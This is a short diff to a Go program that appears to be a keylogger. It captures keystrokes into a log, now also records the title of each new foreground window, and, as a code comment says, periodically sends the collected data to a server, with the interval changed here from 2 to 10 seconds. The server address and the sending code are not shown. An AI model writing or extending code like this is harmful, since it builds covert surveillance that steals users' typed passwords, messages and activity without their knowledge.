@@ -150,7 +150,7 @@ func main() {
 	}()
 
 	// how often the data will be sent to server
-	ticker := time.NewTicker(time.Second * 2)
+	ticker := time.NewTicker(time.Second * 10)
 	defer ticker.Stop()
 
 	// other listeners
@@ -168,7 +168,10 @@ func main() {
 			} else {
 				keylog = append(keylog, "["+key+"]", "")
 			}
-			println(platform.GetCurrentWindow())
+			title := platform.GetCurrentWindow()
+			if len(applog) == 0 || title != applog[len(applog)-1] {
+				applog = append(applog, title)
+			}
 		case <-done:
 			return
 		// send data periodically
